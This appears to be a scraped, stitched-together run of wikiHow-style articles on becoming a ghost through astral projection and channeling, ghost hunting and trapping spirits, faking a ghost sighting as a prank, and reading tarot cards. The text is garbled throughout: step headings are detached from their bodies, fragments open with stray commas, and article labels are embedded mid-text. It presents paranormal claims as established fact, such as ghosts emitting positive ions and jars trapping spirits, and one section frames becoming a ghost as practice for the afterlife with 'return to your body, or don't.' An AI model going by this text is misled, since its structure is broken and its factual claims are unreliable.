, It is said some ghosts avoid these symbols. Plus, if your faith is strong, you will feel more confident.

, Most experts on the matter believe in the method of ""asking and cursing"". If you hear or see something you cannot explain, ask what is it they want. Wait a few seconds. If no reply comes and the manifestation continues, begin to curse heavily and aggressively. Many stories coming from Western European countries feature cursing as a form of making ghosts withdraw.

, Be skeptical about ghost sightings and stories, and always look for the logical explanation in everything. Sometimes, things are not what at first they seem and the human mind likes to play tricks. You hear a noise? Consider everything that may be producing it instead of a ghost: pipes, mice, bats, insects, the wind, the TV, a radio which wasn't properly turned off and is giving off static, a man sharpening his knife, house pets, neighbors. A person once thought he heard footsteps in his house, but later found out old wooden houses do tend to make noise as the wood dilates or shrinks according to temperature changes. Try not to Panic.

, No matter if it is your first time or your hundredth the first thing to do is rid yourself of all of the daily stresses. Go to the room / location you are going to call Spirit. Close your eyes. Take some slow deep breaths. Clear you mind. Once you are calm and clear it is time to call Spirit.

,, Make it clear what you are looking for now that you have called Spirit. This is an important step before doing your working. By saying: “I intend for the Spirits which have come forth today to help me with _________” At this time, begin your working.

Learn about astral projection.,
Start from a relaxed and meditative state.,
Enter into a hypnotic state and attempt to ""vibrate"" each part of your body.,
Slowly move your soul from your body and explore.,
Return to your body, or don't.",How to Become a Ghost2," Astral projection is the belief that people can dissociate their ""souls"" or their subtle bodies from their vital bodies while living, then return to the body at will. Supposedly, W.B. Yeats, famed Irish poet and occultist, appeared in shadowy form at a social gathering hundreds of miles away while in the midst of deep meditation at his home.It is a skill that anyone can practice with deep concentration, though few if any may be able to achieve.


While this may not help you become a ghost, the skills involved in negotiating the difference between your subtle body and your living body is at the heart of transitioning into the afterlife. Think of it as practice.

, It's common to practice projection first thing in the morning, during the liminal state between wakefulness and sleepiness, when the mind is at its most receptive.

, Most astral projection starts with slowly entering into a trance by breathing slowly, stilling the mind, and focusing on a single part of your body.


Focus on your breath. Feel the air moving into your lungs and nourishing your body, relaxing you and warming you. Feel yourself go still. Feel yourself begin to melt.
Start with your foot and imagine in vibrating in consort with the cosmos. Vibrate your leg. Let each part of your body slowly numb to the here and now and become one with the outer world. The idea is that you slowly blur the line between ""you"" and ""not you.""

, When successful, astral projectionists feel their soul leaving their body, taking their consciousness with it. You should feel as if you're moving away from yourself, leaving your body behind. Try to explore an adjacent room, picking a book up off the shelf and reading it. See if you remember what you read when you came to.

, Some people believe that spending too much time outside of the body can make it more and more difficult, or more and more traumatic, to return to it. When you go out exploring the world outside your body, take it slowly. Don't start by flying away to Paris, start by exploring the room you're in, letting your soul do small things. Strengthen your astral muscles. Then return.


It's a common urban legend, reported in the Jimi Hendrix documentary Hendrix, that Hendrix practiced astral projection and died because he lost his way back to the real world. Acid casualty hokum or real-life ghost story? It's hard to say.

Try to find a partner(s).,
Obtain basic ghost hunting equipment such as:


A camera is a piece of equipment that most ghost hunters start.,
Find a haunted location.,
Visit the location and investigate.,
Compare notes about your experiences with your partner(s), online or with other ghost hunters & see if they can relate.",How to Be a Ghost Hunter," You would want to get some backup with equipment, while having an extra eyewitness account(s) if anything supernatural occurs.;
, A 5 megapixel camera is a good one to have. The better the resolution you have, the more detail you'll be able to see in your images.
A good digital recorder is needed to record electronic voice phenomena (EVP). Digital recorders from such manufacturers as Olympus, SONY, and RCA range in price from about $30 into the hundreds of dollars. Again, get the best one you can afford because the higher the price, the better the quality as you'll want a model that can record high-quality sound.
Not everything in the ghost hunter's arsenal is high-tech or requires batteries. A simple pen and paper are just as important on any investigation. Keep notes about the readings of your other equipment, your experiences, and even your feelings.
Get a small but powerful flashlight, one that easily slips into a pocket. These days you can get a small 5- or 6-inch LED flashlight that emits a very good beam of light.
If some equipment, such as your camera, have rechargeable batteries, make sure they are fully charged before the ghost hunt. You might even consider getting extra batteries and charging them as well. Many ghost hunters have noted (and have been frustrated by the fact) that haunted places tend to drain batteries; even fresh batteries seem to go dead quickly.
Meters for detecting electromagnetic fields (EMF) are also popular with ghost hunters on the theory that the presence or movement of ghosts might disrupt or otherwise affect this field.
Paranormal investigators use thermal scanners to detect ""cold spots"" on the theory that the presence of ghosts drains the ambient air of energy or warmth.
You can try to detect a ghost's movement with a motion detector. These gadgets are often used for home security, but the ghost hunter can set them up to possibly detect the movement of something that the eye cannot see.
Always have a first aid on hand. You never know when these types of things could happen.

, Be sure to obtain permission before going onto private property or you could be guilty of trespassing.

, You may wish to take pictures, make recordings and take notes about anything unusual. Try to find out as much about wherever location you go to as possible because this will help identify anyone if a face, body, or both appears in a picture(s). Maybe it'll help to identify someone's voice even if caught on an EVP recorder.

, Some ghost hunters have unusual or rare encounters with these supernatural forces.

"
Learn consciousness and spirit channeling.,
Start by entering a trance.,
Learn to use a Ouija board.,
Explore EVP and other electronic phenomena.,
Practice communicated with spirits via an experienced medium.",How to Become a Ghost3," Channeling is a similar process to astral projection, though somewhat more meditative. Channeling is the process of communicating with the spirit world, and learning more abut your own consciousness in the process. Different traditions treat the concept of ""channeling"" in different ways, but the process is essential the same, regardless of what you believe. How you choose to assign meaning to the symbols and concepts you encounter in your journey may differ, but the basic steps are the same if you're willing to commit to the process.

, Enter a trance state, focusing on warming and relaxing each part of your body. Go slowly. Practice meditation and trance-inducement several times before you attempt to channel.


It's common to picture climbing up a long ladder in pitch blackness, or defending in an elevator into an endless cavern, to visualize transitioning into the subconscious, or into the spirit world (depending on what you believe). For some, picturing a sudden fall helps to allow the subconscious to take over, and the feeling mind overwhelm the thinking mind.
Making contact with the subconscious as a projection, or other entities in the spirit world is the goal of channeling. If you encounter other beings during your deep hypnotic meditations, keep a journal of your interactions and analyze the symbols you encounter. This might prove essential in your transition out of this life.

, The most classic method of communicating with the spirit world is by using the Ouija board, a mat covered with letters, numbers, and short words, used to allow spirits a vessel to communicate with the living. Living participants meditate over the Ouija board, then put their hands on a planchette, which is a small maneuverable pointing tool, that's used to move independently and point to the different letters, spelling out words. Getting some experience connecting via the Ouija board might help you in your ghostly ambitions.

, With the rise in ghost-hunter themed television shows, digital methods of recording ghosts gained lots of popularity in the public. It's an interesting and sometimes spooky way of communicating with the dead, and can be an instructive way of getting started. To try it for yourself, the method is easy: record, at very high volume, a silent room. Ask questions periodically, of any spirits that may be present currently. Later, turn the volume up very loud an listen back.

, To learn more about getting in touch with the world of the dead, contact an experienced medium, someone with well-developed psychic abilities and experience in communicating, to help guide you and show you the ropes. It can be dangerous, psychologically and spiritually, to attempt to get in touch yourself. It's best to consult with a professional.

"
Find a way to communicate with ghosts.",How to Become a Ghost4," To do this, take a recorder and put it somewhere quiet (ghosts hate noise). Say something like ""Spirit, can you turn me into your kind? If yes, then when I say ""thank you"", turn me into your kind strait away. If not, then don't bother turning me into your kind"" then the spirit will answer."

Use the box and burial method.,
Use the candle method.",How to Catch Ghosts," Old houses (like 100 or 200 years old, not from the 1970s, 1980s, or 1990s) are good places to look for ghosts.


Sometimes when a person dies, their spirit will return to the place where they died or a place they can't bear to leave behind, which is often their family home.
These spirits are not usually malevolent (unless their death was violent), so household ghosts are a good place to start for the rookie ghost hunter.
Just be sure to get permission before you go ghost hunting on private property.;
, Cemeteries are another good location for ghost catching, even if they can be a little creepy at night!


Sometimes, ghosts cannot bear to leave their physical bodies behind after death, while other spirits (particular those who haven't been able to move on) come to visit the graves of their family and friends.

, Some of the best locations for ghosts are places where large numbers of tragic deaths occurred, such as old schools, prisons, and asylums.


Not all schools are haunted, but you may have an old school building in your area where students or teachers died due to tragic accidents like fires or smoke inhalation (this was more common in the days when classrooms were heated by iron stoves).

, Old prison buildings are places where many prisoners may have died due to old age, illness, murder or the death sentence.


Even if prisoners didn't die there, prison may have been a place of intense loneliness, fear and anger for some people, causing their spirits to return there after death.

, Insane asylums were notorious for their mistreatment of patients, using inhumane treatments such as shock therapy, water submersion and lobotomies and causing much unnecessary pain and suffering for the unfortunate victims. This makes the sites of old insane asylums a prime location for ghosts.


Be warned, however -- these spirits may be angry and violent, seeking retribution for their poor treatment in life.

, Sites where a large number of deaths occurred are a popular location for ghosts, especially if those deaths were violent. This makes the locations of former battles (even if they have since been built over) prime ghost-hunting territory.

, As mentioned already, people who died tragic or violent deaths are more likely to return to our world as spirits.


Therefore, if you are familiar with the location of a murder or a tragic accident (such as a car crash, drowning or fatal fall), this could be a good spot to test your ghost hunting prowess.

, The most haunted locations in a specific area will depend on the history of each place and the number of paranormal experiences local people have reported.


Therefore, it's a good idea to listen to talk to people and do some research in the local library to find out where to look.
Many cities and towns will have their very own haunted bridge, road or tunnel where decades-worth of unusual activity has been reported., A manual camera is preferable to a digital one as you will have greater control over the exposure, making you more likely to catch a snap of the ghost. The ghost may appear as a blur or streak of light in the developed photograph.


In addition, paranormal activity tends to interfere with the operation of electrical equipment, making a digital camera unreliable.

, A camcorder can also be used to catch a glimpse of any unusual shapes or activity at your chosen ghost-catching location.


Make sure to start recording at the beginning of the session and leave the camcorder running until the end. It will be easier if you set the camcorder on a tripod for the duration of the session.
If your camera has a night-vision feature make sure to turn it on, as this will make spotting a ghost that much easier.

, Sometimes a tape recorder will pick up on sounds that you wouldn't normally be able to hear. These sounds will only reveal themselves when you play the tape back.


Keep in mind that you may have to slow down or speed up the playback or use headphones in order to make sense of what you're hearing.

, An EMF (electromagnetic field) detector measures changes or disruptions to surrounding electrical fields, which may indicate the presence of a ghost.


Good EMF detectors can pick up on disturbances across a wide range of frequencies.
EMF detectors can be purchased online, for anywhere between $20 and several hundred dollars.

, Other specialist equipment that may benefit the serious ghost-hunter includes:


An infrared thermal scanner, which is used to detect hot or cold spots caused by energy-sucking ghosts.
An air ion counter, which measures the number of positive and negative ions in the air. Ghosts are believed to emit a high quantity of positive ions.
However, these items are expensive and will require a certain amount of specialist knowledge in order to interpret the results.

, In recent years, many ghost hunting phone apps have become available, which claim to do the work of expensive, specialist ghost-hunting equipment.


The more advanced apps include EMF detectors, audio detectors and EVP (electronic voice phenomena) instruments and other ghost-detecting capabilities.
The reliability of these apps is the subject of heated debate, and many people consider them just scams or jokes. However, if you're not willing to invest in more expensive equipment, you might want to try them out., Aside from relying on electrical equipment, you'll need to be alert to any physical indications that a ghost may be present.


Watch out for items falling or moving location, seemingly of their own accord.
Keep an ear out for unusual and unexplained noises, such as bangs or thumps.
Pay attention to any sudden changes in temperature, or for general feelings of unease or feeling ""spooked"".

, If you want to lay a troubled spirit to rest, you should use this method.


Take a metal container with a tight-fitting lid and cover the bottom with a layer of soil taken from hallowed ground, such as a church or cemetery.
Leave the container open at the location where you found the ghost. The sanctified soil will draw the spirit in.
Once you have used your ghost-detection apparatus to confirm that the spirit has entered the container, slowly and gently replace the lid, then sprinkle a pinch of salt on top.
Bury the container in hallowed ground.

, The candle method is good for trapping pesky spirits who are causing trouble around the home.


Take a large glass jar, open the lid and place a candle inside. At midnight, light the candle and place the jar in a central point at the haunted location.
The ghost will be attracted by the energy emitted by the burning candle, but this energy will also trap the ghost inside the jar.
Once you have confirmed the ghost's presence inside the jar, tightly replace the lip. The candle will burn out on its own.
Keep the jar tightly sealed as long as you wish to hold the ghost captive. If the jar is opened or broken, the spirit will be released and might come to exact revenge on its captor! "

Choose a deck of cards.,
Develop a mission statement.,
Transfer your energy to the deck.,
Understand how the deck works.,
Get a good book.",How to Read Tarot Cards1," Different tarot decks use different symbology. One of the most widely used and most widely taught is the Rider-Waite Tarot or one of its clones--the Morgan-Greer Tarot, for example. Still, it's important that a tarot deck speak to you, so look through different ones and read reviews to learn what people like and dislike about them.


Classic and popular decks are always in circulation, but new tarot decks are published each year so there is an ever-changing inventory to look through.
The top five tarot decks of all time are: Deviant Moon Tarot, Rider-Waite Tarot, Aleister Crowley Thoth Tarot, DruidCraft Tarot and Shadowscapes Tarot.;
, Defining exactly what you hope to accomplish in your relationship with the Tarot can help you on your journey as a reader. When you know your desired end result, you'll be better able to look objectively at where you are now and what steps you must take to reach your ""destination."" Ask yourself your intention for your Tarot deck or how you plan to use it to serve others. Mission statements may reflect goals such as wanting to develop greater intuition, enhance creativity or connect with spiritual forces. These statements are different and personal to each individual who crafts one.

, The best way to do this is to handle the cards. Shuffle them again and again. Put them in order (from Fool through the World, followed by each of the suits, from Ace through Ten, then Page, Knight, Queen and King). Handling your cards helps them to become an extension of you.

, The Tarot deck is made up of 78 cards: 22 major arcana and 56 minor arcana. You must memorize and be able to identify each card as well as give two divinatory meanings for each card.


Major arcana. The Tarot archetypes represented in the major arcana are pictures that represent life and the stages and experiences we all go through. It's meant to be the story of one's journey through life starting as The Fool (young, pure energy in spirit form) moving through events and cycles and finding completion in The World (the end of our life cycle).
Minor arcana. Minor Cards describes the people, events, feelings and circumstances we encounter on our personal ""Fool's Journey.""It represents events that are within the control of the individual and indicate how you do something. The minor arcana fairly closely resembles a traditional deck of playing cards. It's made up of four suits, and each of these suits are associated with one of the elements: Wands (Fire), Cups (Water), Pentacles (Earth) and Swords (Air). There are also the Queen, King and Knight (or Jack) of each suit plus the addition of Pages or Princesses.

Memorizing all 78 cards will take time. Try working with a partner who can quiz you using the deck as a kind of set of flash cards.



, A well-written book that will help you understand the basics of Tarot will be extremely helpful in getting you started reading tarot cards. Some take you through the process in a way that emphasizes memorization while others encourage participation. Choose a book that suits your learning style.


Don't plan to rely too heavily on your book. It will be helpful to get you on track for learning, but you need to integrate your intuition with your book knowledge to fully develop as a Tarot card reader.
Try this trick for incorporating your intuition into your learning. Look at each card and decide what you think it means. Don't worry about being right--just go from your gut. Then look in your book and see what it says. This will take the focus off pure memorization and the fear of being wrong and allow you to create readings that flow because of the way you've personally connected with the cards."
"
Pick a card-a-day.,
Study card combinations.,
Make constellations.,
Play the card resolution game.",How to Read Tarot Cards2," You can choose a card simply as a way of getting to know the deck or you may pick one to get some insight into the day ahead of you.



To get to know the deck. Choose a card at random and gaze at it a bit. Write down your first impressions and intuitive thoughts. Write these with one particular color of ink a journal or notebook. With a second, different ink color, write down more information you find about the card from other sources (books, e-groups, friends). After a few days, review what you've written and add comments in a third color of ink.Get a daily reading. Choose a card at random the first thing in the morning. Spend some time looking at it. Pay attention to its colors and how you react to them. Note the general atmosphere of the card and the emotions it brings out in you. Look at the figures in the card--what they're doing, whether they're seated or standing, who they remind you of and how you feel about them. Focus on the symbols and what they remind you of. Write your thoughts down in a journal--you can refer back to this as a learning tool and use it to track your progress., It's important for beginners to view the Tarot not as 78 separate cards but as a system of patterns and interactions. Studying card combinations can help you embrace that concept. Draw two cards from the deck and put them face up next to each other. Now, look for images, locations or events within the two-card combination. You can work with more cards or do an entire spread. The idea is to learn the cards in combinations to develop deeper understanding and greater confidence when it comes time to doing a reading.

, Tarot constellations are made up of all cards that carry the same digit (number one through nine). For example, the Tarot constellations for the number four would be the number four card from each of the suits, the Emperor (which carries the number four) and Death (which carries the number 13 but reduces to the number four (1+3=4).Line up all the cards from a constellation in front of you and ask yourself some questions such as how you feel about each card, what attracts, repels, annoys or makes you anxious about the cards, how they're alike and how they're different and what symbols they seem to share. Repeat this exercise for each of the nine prime numbers and record your impressions in a journal.
Understanding the energy of each of these cards will facilitate a smoother reading when multiples of the same number come up. Instead of focusing on the meaning of individual cards, you'll be able to focus on the energy they bring in as a group., Go through your deck and pull out cards that strike you as being difficult. Spend some time with them to try to get to the root of your impression. Then go through the deck again and pull out one or more cards that you feel brings resolution to those difficult cards.


This game actually helps you develop a skill you can use in your readings. When a difficult card comes up in one of your readings and you want to help the Seeker resolve that issue, you can suggest a card that will counteract the difficult card."
"
Tell a story.,
Get familiar with spreads.,
Start with a Three-Card Spread.",How to Read Tarot Cards3," A Tarot reading is a narrative, a story that you tell to the Seeker. It's an attempt to highlight past influences, understand present circumstances and predict the most likely future. The future you speak of will not be a fixed or definitive outcome; it's important to remember that there are no conclusive endings or absolutes.

, A ""spread"" simply refers to the layout of your cards. A Tarot spread is a configuration or pattern of cards. That pattern provides the framework for a tarot reading. Further, each position of the tarot cards in a spread has a specific meaning. Your reading will use the placement or position of the cards within an identified theme. For example, many spreads include positions for the past, present and future. They can also include positions for internal feelings, specific challenges, external factors and so on.There are hundreds of spreads to try, and more experienced readers can make up their own. Experiment with different spreads, trying especially to choose ones that encourage your imagination and intuition. Figuring out what works best for you is important; many readers come to rely on specific spreads that work best for them.

, A three-card spread is great for divining answers to uncomplicated questions, for refocusing on simplicity an for beginners who have just started reading. Assign the positions in advance, lay out your spread and use what you've learned about card meanings and combinations to tell a story.


Some possible positions for a reading designed to understand a situation are: past/present/future, current situation/obstacle/advice, where you stand now/what you aspire to/how to get there and what will help you/what will hinder you/what is your unrealized potential.
Some possible positions for a reading designed to understand relationships are: you/the other person/the relationship, opportunities/challenges/outcomes, what brings you together/what pulls you apart/what needs your attention and what you want from the relationship/what you want from the relationship/where the relationship is heading.
Some possible positions for a reading designed to understand relationships are: mind/body/spirit, material state/emotional state/spiritual state, you/your current path/your potential and stop/start/continue."

Put it all together.",How to Read Tarot Cards4," To begin this 21-card spread, separate the Major Arcana from the Minor.

, Shuffle each set of cards, cut them and lay them out in rows of three across, seven down with one card to the side. This will use all of the Major Arcana but leave some Minor Arcana cards. Set these aside in a pile.

, Make a list of the cards you've laid out. Pick a word that best describes each and write it down beside them.

, What do they suggest to you? Identify a narrative pattern, as though you are looking at a book of illustrations and trying to find the story. The patterns can go across, down, diagonally or first to last. The card to the side signifies the most important element of the situation.

, Ask yourself which situations in your life or in the life of the person whose cards you are reading, the cards seem to be alluding to.

, Look for narrative patterns that offer alternatives to the end first perceived, things that could make the situation better or worse.

, Consider the words you've assigned to each of the cards. How do these apply to the stories you've identified?

, Combine your perceptions from the above steps into one reading. You might be amazed at how much more accurate the reading is than when you use the deck's guide.


Remember that if at some point a card feels like it has a different meaning to you than what the book says, go with that meaning. Trusting your intuition is the true way to read tarot cards and something you'll begin to do naturally you become more experienced. Just let the cards speak to you.

Store your deck properly.,
Decide who can touch your cards.,
Clear your deck.",How to Read Tarot Cards5," Tarot cards can pick up negative energy that can interfere with your readings. It is recommended that you store your cards in a black-lined bag or in a wooden Tarot card box. You can add in gemstones or herbs that increase psychic abilities.

, It's a matter of personal preference as to whether or not you'll allow the Seeker to touch your cards. Some readers encourage it--the have them shuffle the deck as a way of transferring their energy to the cards. Other readers prefer not to have anyone's energy except their own on the deck.

, There will be times when you need to clear or cleanse your deck to rid it of negative energy. There are many ways to it, but one simple way involves calling on one of the four elements. When using this method, begin by fanning the deck; if extreme cleansing is needed, the cards can be cleared one at a time.


Earth. Bury your protected deck in sand, salt or dirt for 24 hours. Alternatively, fan your deck on a tablecloth and sprinkle it with salt and/or sand for one to two minutes or any combination of basil, lavender, rosemary, sage or thyme.
Water. Sprinkle your cards lightly with water, herbal tea or a plant infusion and wipe immediately or expose your deck to moonlight in a protected area for half the night.
Fire. Taking care not to burn yourself, pass your deck quickly through a candle flame. You can also expose your deck to sunlight in a protected area for half a day.
Air. Pass your deck five to seven times over burning incense. Or try instead taking a deep breath and breathe deeply and slowly into your deck three times.

Go and get together with your friends and do the activity of your choice.,
Imagine you can see the ghost.,
Demonstrate your reaction.,
Respond to your friends.,
Escalate the act.,
Reveal the truth - or don't.",How to Act Like You Saw a Ghost2," For example, you might play a game or sport together. Be normal and participate.

, Clearly know where the ghost is in your mind... Get yourself worked up so you are freaked out.

, Become speechless, widen your eyes slightly, and stare at a fixed spot.

, At this point, your friends will probably ask you what is bothering you. Keep silent for a second and then in a hurried hushed, paralyzed sounding voice ask them, 'Can you see that'?

, When they say 'no', pretend that you feel truly isolated; you have to swear that you saw it and passionately believe that you did. At this point, you may fear that they do not believe you at all and that you are pranking them; to pull off the prank, you have almost to believe that you are telling the truth. Stay committed to the act.

, Now you can take it further, or you can break the prank off... it is your choice. To take it further, something needs to actually happen that freaks them out; you can add to the game by pranking them somehow - for example, arranging for a friend to appear behind them and surprise them, or for someone to flicker the lights or turn off the power on cue. If you plan it carefully, you can create quite an illusion to draw out the ghost prank.

Tarot decks can usually be found at bookstores or occult shops. If you’re not in such a populated area, you may have to try ordering your deck online.
The most common and recognizable tarot deck is the Rider-Waite deck. If you’re just starting out, consider choosing the Rider-Waite; many guides and books on tarot reading will involve the Rider-Waite almost exclusively.
Again, the differences you’ll find between tarot decks will almost always be cosmetic ones. If you’d like to have your readings associated with a particular religion or brand of spirituality, there’s most likely a tarot deck with images and names to match that association.

In terms of setting up, the sort of deck you choose will make no difference, unless the deck includes any explicit instructions to do otherwise than recommended here.
It’s in reading that deck choice will really matter (a reason why the Rider-Waite is recommended to first-timers). You’ll draw different implications from decks which use differing images and names for their cards.
Don’t be afraid to pick up and try multiple decks. Since they’re so interchangeable, there’s little risk of confusing yourself or mixing rules.


Ultimately the choice is totally yours. Whether you intend to delve into divination or just want to entertain your friends, the choice of tarot deck is an entirely personal one.;
, While the specifics of preparation will eventually depend on the “spread” (method of reading) you choose to use, most will involve shuffling your deck before beginning. Even before that, take time to look over the cards in your deck, recognizing which are Major and which are Minor Arcana.


Be sure to remove any extra cards from the deck (blank or instructional cards) before setting your deck down to begin.
While not every spread will demand the separation of the Major and Minor Arcana, you may want to anyway, if only to get a better sense of the different cards.
Regardless of whether or not you’ll need to separate the Major/Minor Arcana, there’s no specific amount or type of shuffling you need to do. Do it as much (or as little) as you’d like.

, The space required for a tarot reading will also depend on the spread which you eventually decide to use. Some spreads only call for a small surface in which to place a handful of cards, others call for significantly more space to form a circle of several cards.Do your best to match your reading surface to the purpose for a reading. If it’s a personal reading, find somewhere relaxing and comfortable where you can be at ease. If you’re reading for friends or to entertain, find a place with some space.
Again, there’s no specific right or wrong when choosing a place to perform a reading. There’s also no rule saying it needs to be the same place twice. Don’t be afraid to move around if that’s what is comfortable for you.

, Traditionally the most common spread as well as the one most suggested for use by beginners, the three card spread is a simple one. This spread will require that you separate the Major and Minor Arcana cards from one another. Shuffle both decks before beginning (again, there’s no particular amount of shuffling you need to do).There are two variants to the three card spread, one including a Major Arcana card, and one which doesn’t. The included Major Arcana card is meant to aid interpretation, so consider including it for your first tries.

For some foresight into reading, the single Major Arcana card which is included in the three card spread is a means of interpretation.
Some guides including the three card spread choose to see the Major Arcana card included as representation of the person being read, others have it as a representation of the situation or question at hand.
Not including the Major Arcana deck will make for a more stripped-down reading with a more narrow range of possible interpretation.


If you are including a Major Arcana card, take the top card from the now-shuffled Major Arcana deck and place it face-up in front you.
Then, take the three top cards of the Minor Arcana deck and lay them horizontally, left to right, underneath the Major Arcana card just placed.
While the reading of the three card spread will differ depending on how you learn to read tarot, the three Minor Arcana cards will usually represent past, present, and future (in the order, from left to right). If you included a Major Arcana card, it will be the card through which the others are interpreted.

, More refined than the three card spread, the five card spread is meant to inform on a specific course of action. Whereas the three card spread concerns the subject’s general situation, you’ll want to try the five card spread when the problem at hand can be summed as “what should I do?”


This spread doesn’t separate the two Arcana types. Keep them shuffled together in one deck.
Drawing from the top of the deck, place the first card in front of you (a card will be added on each of its four sides). This card will represent the present.
The second card goes to the left of the first, and represents the past and its effect on the present. The third will go to the right, and represents the future.
The fourth card will go below the first, and represents the reason for asking the question at issue. The fifth goes above the first, and represents the potential outcomes of the situation.

, This spread will form a sort of crescent, or curve, of seven cards. Not quite as general as the three card spread but not as specific as the five card spread, the ellipse is best for interpreting any direct question (whether yes/no or otherwise). Like the five card spread, the ellipse doesn’t separate the minor and major Arcana, Keep them shuffled in one deck.


From the top of the deck, place the first card to the far left of your playing surface. This card represents the past and its influence on the question.
To the right of the first card and slightly lower on the table (closer to you) place the second card. This will represent the present. The third card will also go to the right and slightly lower, and it represents the concerns of the future.
Again to the right and lower, place the fourth card which will be the center of the ellipse (the cards will be placed higher up now). It represents what to do in the current situation.
Now to the right and higher on the table, place the fifth card. It will represent external forces affecting the situation. The sixth card will follow the pattern, and represents the hopes and fears of the one being read for.
The last card will be placed at the far right, completing the ellipse. It represents the ultimate outcome of this situation.

, A bit more involved, the celtic cross will take up more space than the three card spread, as it uses ten cards placed into a large pattern. Though the method of interpretation will differ depending on how your learn to read tarot, the celtic cross is designed to answer specific questions. This spread does not require the separation of the Major/Minor Arcana, so combine both sets if separate, and shuffle well.The celtic cross is formed by two sections, one circle of six cards and one “staff” of four. Begin by placing the first card in front of you, and then the second card on top of that one, laying lengthwise. These two cards will represent the present and the challenges or obstacles faced in the present.
The next card will be placed to the right of the two just placed, and the fourth card will be placed underneath the same two (both cards placed straight up). The card to the right represents the distant past, and the card underneath signifies the recent past.
The fifth card placed will be placed above the central two cards, and the sixth will be placed to the left. The fifth one placed will represent the optimal outcome of the question, and the sixth represents the immediate future.
To form the “staff” at the right of circle just formed, place four cards in a vertical row, starting at the bottom. The bottom-most card (the seventh) will represent the factors affecting the question at hand, the next card up (the eighth) represents external influences on the question. The ninth represents the asker’s hopes and fear, and the tenth and final card represents the eventual outcome of the question.
Because this guide only outlines how to set up tarot cards, any resources you use to learn to read may offer alternate methods of reading the celtic cross.

, Because tarot is so personal and representative of the reader and the person being read for, there’s no “wrong” spread to use for a reading. You may feel existing spreads don’t provide the right amount of representative cards or the right variety of representation. Feel free to try any number of variations on old or new spreads you find.Try experimenting with existing spreads by including or separating Major and Minor Arcana cards before placing your spread.

Ask yourself what it is that you want to share with your students.,
Write down what you have to offer your prospective students.,
Once you've decided what your class is going to cover, decide how many lessons and/or classes it will take to teach this information.,
As you plan your classes, you will need to consider locations.,
The next step is to fine tune your lesson plan.,
A month or so before your class, start getting the word out.,
The day of the class, make sure you have all the supplies you need, and arrive early.,
After the class, make sure to get feedback from the students!

",How to Teach a Tarot Card Class,"  Do you have techniques or talents that are unique to you? If so, you may want to focus on these to pass on to your students. One example would be if you have a method of teaching the Tarot that will help the student gain insight into the deck on level that would take years if they were to take the traditional path to learning?  If so, build a class on that method.;
,  Make point form notes, then expand them. Don't worry if you have no idea how your ideas are going to work, write all your thoughts as soon as they come to you.  Refine those brainstormed ideas into ones that you think your students would be able (and want) to learn.

,  Some options that may work are a single session of 4 hours, a weekend encompassing 2 days, or a weekly class over the course of months.

, You will need to also consider refreshments, breaks (if you plan a longer session), and supplies (will they need their own cards?) Another consideration is cost. How much will you be charging?

,  Once you get it down to a tee, get a friend to play 'student' and teach your class to them. See if you get your message across in the time allotted, without wasting any, and your student seems pleased with what they've learned, and eager for more. Get feedback from your friend.

, Place an ad in the local paper, new age book store, flyers, etc. Too many people wait until the last minute, and that could mean a smaller attendance.

, This will allow you to relax before people start to arrive.

Learn the established meanings behind individual cards.,
Assess what individual cards might mean to you.,
Learn a variety of ways to use your cards.,
Keep practicing.,
Practice visualizing using your deck before using them.",How to Use Tarot Cards1," Tarot cards evolved out of regular playing cards during the 15th century. However, they did not take their current form until around 1909, when the Rider-Waite tarot deck was created.The images on this deck are the ones now commonly associated with tarot.


Each tarot deck has 78 cards, 22 of which are called the ""trumps"" or major arcana, and 56 of which are called the minor arcana. The major arcana refer to big and important life events or themes, while the minor arcana refer to more daily themes or events.;
, There are established meanings behind all of the tarot cards.You can explore these meanings in the wide variety of tarot books out there.


Some of the most well-known cards include The Fool, The Lovers, The Hanged Man, and the Death card. The Fool symbolizes someone who has all they need but should be wary of making a misstep or foolish choice.The Lovers card may or may not reference romantic love, instead signaling a choice that needs to be made in order to follow the path you want.The Hanged Man usually has an image of a person hanging upside down from a tree of wisdom by one foot. This card symbolizes the sacrifices one may need to make in order to gain wisdom from the world.The Death card can mean actual death but more likely it is referencing some other sort of ending, for instance the end of a relationship.Remember that the meaning of a card can change depending of the direction it is facing. While not all tarot users pay attention to the direction of the card, many find that it gives the card a deeper meaning.Study the upside down variation as well as the meaning for a card that is right side up.

, In addition to reading up on the established meanings of each card, look at the images on each card and assess the cards meaning based on the image.


While the established meaning of each card is important for you to get the feel of the card, the meaning should change a bit after using tarot cards for awhile. Your interpretation should become more about your personal association with the general theme of the card, as opposed to anything written about it in a book., There is not just one way to use tarot. Explore a variety of types of spreads, the term used for how the tarot cards are laid out, and practice whichever spreads you find helpful., Like everything, learning tarot takes practice. Once you feel confident in your understanding of the cards, try using them for divination or self reflection on a regular basis.

, Imagine there is an orange clear light surrounding the earth. Then, imagine that the light is shining down onto your tarot cards. Imagine that the orange light contains all of the answers of the world, opening the space for infinite possibility and knowledge.

, After holding the cards in your hand for a few seconds and directing your energy toward them, shuffle the deck. You can either do this as you would traditional playing cards or by doing a series of cuts of the deck, whichever you prefer.

, Hold the card you chose in your hand. Focus on its image and message. Open yourself to the possibilities of it's guidance.


While some people see the cards they draw as a sign of things to come, others use them to work on aspects of themselves. Whether you believe that the cards can tell you the future or if you just want to use them to help you through some self discovery, tarot cards can be of great use.

, Let the actual card just sit on the table. Then, when you are ready, flip the card back over in your mind and let it go. Follow that by turning the actual card back over and then sticking it into the middle of the deck.

Interpret the cards you have dealt.,
Turn the cards face down when you are done with your reading.",How to Use Tarot Cards4,", Center your energy and your mind. Charge the cards by holding them in your hand and sending your energy into them. Gently shuffle them.

, An incantation is like a statement or question asking what you want from the cards. This can be a vague or specific question, it's your choice.

, Make sure to cut the deck several times, until the cards are in a totally random order.


If you are doing the reading for someone else, have them shuffle the deck. After all, if the reading is supposed to be about them their energy should be in the cards.

, The first card you will place in the center. The next card will be placed directly to the left of the center card and the third card will be placed to the right of the center card. The fourth card is placed at the bottom of the center card and the fifth, and final, card is placed directly above the center card.The meaning of each card placement is important, as it is in all spreads. The three horizontal cards represent the past, present, and future from left to right, as they do in a three card spread. The bottom card represents the reason you are asking the tarot questions and the top card represents the potential for your question.

, Look at the cards first before thinking about their traditional meanings. Let the images rise to the front of your mind. Try not to have expectations for an answer to your question, simply seek vision and insight.


Pick up each card as you interpret it. Look at the picture on it. What stands out? What specific meaning might it have for you or the person you are doing the reading for?
Look up what that card means using your books and resources. In the beginning you might refer to your book or online resources often to help you move forward.
Want resonates with you? You know the truth through your experiences. When a message from the cards or books sticks out in your mind, you know that is a potential answer to your question.

